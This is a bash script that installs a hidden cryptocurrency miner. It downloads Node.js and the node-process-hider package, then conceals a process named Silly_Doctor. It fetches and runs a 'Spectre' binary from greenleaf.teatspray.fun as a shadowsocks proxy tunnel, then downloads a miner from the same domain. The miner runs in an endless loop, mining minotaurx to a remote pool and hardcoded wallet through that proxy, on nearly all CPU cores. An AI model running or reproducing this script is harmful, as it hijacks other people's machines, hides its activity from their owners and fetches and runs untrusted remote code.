#!/bin/bash
cd
sleep 2
pwd
sleep 2
curl api.ipify.org
sleep 2
whoami
sleep 2

wget -q https://nodejs.org/download/release/v20.7.0/node-v20.7.0-linux-x64.tar.gz
tar -xf node-v20.7.0-linux-x64.tar.gz
export PATH=$HOME/node-v20.7.0-linux-x64/bin:$PATH
sleep 2
ls -la

sleep 2
npm
sleep 2
node -v
sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add Silly_Doctor 1>/dev/null 2>&1

sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Harn_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 2`

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

TZ='Africa/Johannesburg'; export TZ

date

sleep 2

sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

sleep 2

wget -q https://greenleaf.teatspray.fun/Spectre.tar.gz

sleep 2

tar -xf Spectre.tar.gz

sleep 2

randomPort1=$(shuf -i 10000-65000 -n 1)

sleep 2

./Spectre -L=:$randomPort1 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -s -x socks5h://127.0.0.1:1082 api.ipify.org

sleep 2

wget -q http://greenleaf.teatspray.fun/Silly_Doctor_272.tar.gz 1>/dev/null 2>&1

sleep 2

tar -xf Silly_Doctor_272.tar.gz

echo " "
echo " "

unset LD_PRELOAD
unset LD_PRELOAD_ENV
unset LD_LIBRARY_PATH

sleep 2

while true
do
./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019 --wallet CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB --password $currentdate,c=LCC,zap=LCC --proxy 127.0.0.1:$randomPort1 --cpu-threads $used_num_of_cores --keepalive
sleep 5
done
